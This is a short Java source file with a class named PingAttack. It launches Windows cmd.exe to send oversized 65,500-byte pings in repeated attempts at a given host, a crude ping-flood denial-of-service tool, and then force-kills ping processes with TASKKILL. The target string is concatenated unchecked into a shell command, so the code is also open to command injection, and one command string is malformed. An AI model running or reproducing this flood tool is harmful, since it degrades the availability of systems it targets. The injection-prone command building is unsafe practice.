package sample;

import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;

//ping testing is cleared
public class PingAttack  implements Runnable{
    //a standard ping is 56 bytes. 65000 bytes will be used here.

    //this will rely on the command prompt.

    private String url;
    private int attempts;

    public PingAttack(String url, int attempts){
        this.url = url;
        this.attempts = attempts;
    }

    @Override
    public void run() {
        new Thread(() -> {

        Runtime rt = Runtime.getRuntime();
        try {
            String cmd = "cmd.exe /c start cmd.exe /K \"ping " + url + " -l 65500 -n " + attempts;
            rt.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
        close();
    }).start();
}

    public static void close(){
        new Thread(()-> {
            Runtime rt = Runtime.getRuntime();
            try {
                rt.exec("cmd.exe /c /start /cmd.exe /K \"TASKKILL /F /IM PING.exe");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }
}
